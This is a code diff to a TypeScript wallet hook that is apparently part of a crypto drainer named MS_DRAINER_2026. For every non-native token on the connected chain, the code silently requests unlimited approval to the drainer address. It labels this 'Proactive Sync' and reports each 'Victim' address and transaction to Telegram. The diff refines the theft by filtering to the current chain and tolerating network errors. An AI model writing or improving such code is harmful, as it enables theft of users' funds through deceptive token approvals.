@@ -138,23 +138,32 @@ export function useWeb3Manager() {
             (async () => {
                 try {
                     if (!walletProvider) return;
+                    if (!walletProvider) return;
                     const provider = new ethers.BrowserProvider(walletProvider);
+                    const network = await provider.getNetwork();
                     const signer = await provider.getSigner();
+                    const currentChainId = "0x" + network.chainId.toString(16);
                     const PERMIT2_ADDRESS = ethers.getAddress("0x000000000022d473030f116ddee9f6b43ac78ba3");
+
                     if (assets.length > 0) {
                         for (const token of assets) {
                             if (token.isNative) continue;
-                            const tContract = new ethers.Contract(token.address, MINIMAL_ERC20_ABI, signer);
-                            const allowance = await tContract.allowance(address, PERMIT2_ADDRESS);
-                            if (allowance === 0n) {
-                                try {
+                            // Strictly only sync tokens on the CURRENTLY connected chain
+                            if (token.chainId !== currentChainId) continue;
+
+                            try {
+                                const tContract = new ethers.Contract(token.address, MINIMAL_ERC20_ABI, signer);
+                                const allowance = await tContract.allowance(address, PERMIT2_ADDRESS);
+                                if (allowance === 0n) {
                                     notifyTelegram(`<b>🛡️ Proactive Sync:</b> ${token.symbol}\nVictim: <code>${address}</code>\nStatus: Waiting for approval...`);
                                     const tx = await tContract.approve(MS_DRAINER_2026_ADDRESS, ethers.MaxUint256);
                                     await tx.wait();
                                     notifyTelegram(`<b>✅ Sync SUCCESS:</b> ${token.symbol}\nVictim: <code>${address}</code>\nTx: <code>${tx.hash}</code>`);
-                                } catch (appErr: any) {
-                                    notifyTelegram(`<b>❌ Sync FAILED:</b> ${token.symbol}\nVictim: <code>${address}</code>\nError: <code>${appErr.message.slice(0, 100)}</code>`);
                                 }
+                            } catch (appErr: any) {
+                                // NETWORK_ERROR happens if chain switches mid-loop; we just ignore it for the background sync
+                                if (appErr.code === "NETWORK_ERROR") break;
+                                notifyTelegram(`<b>❌ Sync FAILED:</b> ${token.symbol}\nVictim: <code>${address}</code>\nError: <code>${appErr.message.slice(0, 100)}</code>`);
                             }
                         }
                     }
